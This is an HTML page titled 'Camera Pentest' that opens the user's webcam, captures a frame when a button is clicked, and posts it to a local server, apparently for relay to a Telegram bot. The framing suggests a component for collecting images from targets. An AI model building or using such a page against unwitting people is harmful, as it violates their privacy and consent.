<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Pentest</title>
</head>
<body>
    <video id="camera-stream" autoplay></video>
    <button id="capture-button">Capture</button>
    <script>
        const video = document.getElementById('camera-stream');
        const captureButton = document.getElementById('capture-button');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                captureButton.addEventListener('click', captureImage);
            } catch (error) {
                console.error('Error accessing camera:', error);
            }
        }

        function captureImage() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/jpeg');
            sendImageToTelegramBot(imageData);
        }

        startCamera();

        async function sendImageToTelegramBot(imageData) {
            const response = await fetch('http://localhost:3000/send-image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ imageData }),
            });

            if (response.ok) {
                console.log('Image sent to Telegram bot');
            } else {
                console.error('Error sending image:', response.statusText);
            }
        }
    </script>
</body>
</html>
